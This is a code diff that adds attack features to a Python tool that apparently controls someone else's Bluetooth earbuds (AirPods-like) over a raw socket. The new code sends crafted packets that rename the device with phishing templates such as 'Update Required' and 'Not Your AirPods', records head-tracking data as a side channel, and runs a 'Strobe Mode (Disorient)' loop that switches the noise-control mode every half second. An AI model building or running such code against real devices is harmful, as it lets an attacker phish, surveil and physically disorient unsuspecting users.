@@ -54,6 +54,50 @@ class ControlModule:
         except Exception as e:
             self.log(f"[red][!] Failed to send command: {e}[/red]")
 
+    def set_name(self, new_name):
+        
+        name_bytes = new_name.encode('utf-8')
+        if len(name_bytes) > 64:
+            self.log("[red][!] Name too long (max 64 chars).[/red]")
+            return
+
+        header = b'\x04\x00\x04\x00'
+        opcode = b'\x1A\x00'
+        length = bytes([len(name_bytes)])
+        
+        packet = header + opcode + length + name_bytes
+        
+        try:
+            self.sock.send(packet)
+            self.log(f"[bold red][*] Sent Rename Command: '{new_name}'[/bold red]")
+            self.log("[dim]Note: This may require the user to open the case to take effect.[/dim]")
+        except Exception as e:
+            self.log(f"[red][!] Failed to send rename command: {e}[/red]")
+
+    def monitor_head_tracking(self):
+        self.log("[bold cyan][*] Monitoring Head Tracking Data... (Move head to see values)[/bold cyan]")
+        self.log("[dim]Note: Requires spatial audio enabled/requested context[/dim]")
+        try:
+             while True:
+                 data = self.sock.recv(255)
+                 if len(data) > 4:
+                     hex_data = data.hex()
+                     self.log(f"[cyan]RX:[/cyan] {hex_data}")
+        except KeyboardInterrupt:
+             pass
+
+    def strobe_mode(self):
+        self.log("[bold red][!] STARTING STROBE MODE (ANC <-> TRANSPARENCY)[/bold red]")
+        self.log("[dim]Press Ctrl+C to stop[/dim]")
+        try:
+            while True:
+                self.set_noise_control(0x02) 
+                time.sleep(0.5)
+                self.set_noise_control(0x03) 
+                time.sleep(0.5)
+        except KeyboardInterrupt:
+            self.log("[yellow]Strobe stopped.[/yellow]")
+
     def start_control(self):
         if not self.connect():
             return
@@ -65,6 +109,9 @@ class ControlModule:
         self.log("1. Force Transparency (Hear Environment)")
         self.log("2. Force ANC (Silence)")
         self.log("3. Force Off (Normal)")
+        self.log("4. [red]Phishing: Rename Device[/red]")
+        self.log("5. [magenta]Side-Channel: Head Tracking Monitor[/magenta]")
+        self.log("6. [red]Active: Strobe Mode (Disorient)[/red]")
         
         try:
             while True:
@@ -75,6 +122,27 @@ class ControlModule:
                     self.set_noise_control(0x02)
                 elif choice == "3":
                     self.set_noise_control(0x01)
+                elif choice == "4":
+                    self.log("[yellow]Phishing Templates:[/yellow]")
+                    self.log("  a) 'Connection Failed'")
+                    self.log("  b) 'Update Required'")
+                    self.log("  c) 'Not Your AirPods'")
+                    self.log("  d) Custom Name")
+                    sub = input("Select template/custom > ")
+                    
+                    target_name = ""
+                    if sub == "a": target_name = "Connection Failed"
+                    elif sub == "b": target_name = "Update Required"
+                    elif sub == "c": target_name = "Not Your AirPods"
+                    else: target_name = sub
+                    
+                    if target_name:
+                        self.set_name(target_name)
+                    
+                elif choice == "5":
+                    self.monitor_head_tracking()
+                elif choice == "6":
+                    self.strobe_mode()
                 elif choice == "exit":
                     break
         except KeyboardInterrupt:
